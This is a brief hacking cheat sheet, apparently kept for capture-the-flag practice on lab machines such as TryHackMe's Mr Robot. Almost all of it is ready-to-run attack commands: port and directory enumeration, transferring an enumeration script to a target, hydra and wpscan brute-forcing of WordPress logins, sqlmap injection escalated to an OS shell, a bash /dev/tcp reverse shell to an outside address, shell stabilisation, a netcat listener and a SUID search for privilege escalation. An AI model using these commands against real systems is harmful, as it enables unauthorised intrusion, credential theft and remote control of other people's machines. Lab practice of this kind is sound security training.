##We are going to do basic of Hacking

#Enumeration
1. nmap -sC-sV <`ip address>
2. nmap -sT <'ip address>
3. nmap -sP <'ip address>

#Enumeration
1. gobuster dir -t 100 -u <`ip address> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

Linux Enum - /opt/LiEnum.sh - Run at Target using wget and http server created

BruteForcing

1. hydra -L fsocity.txt -p mypassword 10.10.186.250 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:Invalid username"

2. hydra -l Elliot -P fsocity.txt 10.10.186.250 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:The password you entered for the username Elliot is incorrect."

3. wpscan --url http://10.10.89.214 -t 50 -U elliot -P /home/kali/Documents/tryhackme/mr-robot/fsociety.txt

Sqlmap
1. sqlmap -u 'http://10.129.233.138/dashboard.php?search=any+query' --cookie="PHPSESSID=9qik8dt7ol8fpsbi63t0beft1l"
2. sqlmap -u 'http://10.129.233.138/dashboard.php?search=any+query' --cookie="PHPSESSID=9qik8dt7ol8fpsbi63t0beft1l" --os-shell


reverse shell
1. bash -c "bash -i >& /dev/tcp/10.10.14.161/443 0>&1"

Pty enable
python3 -c 'import pty; pty.spawn("/bin/bash")'
ctrl Z
stty raw -echo
fg
export TERM=xterm

listen on PC
1. nc -nlvp 4444

Find SUID
1. find / -perm -u=s -type f 2>/dev/null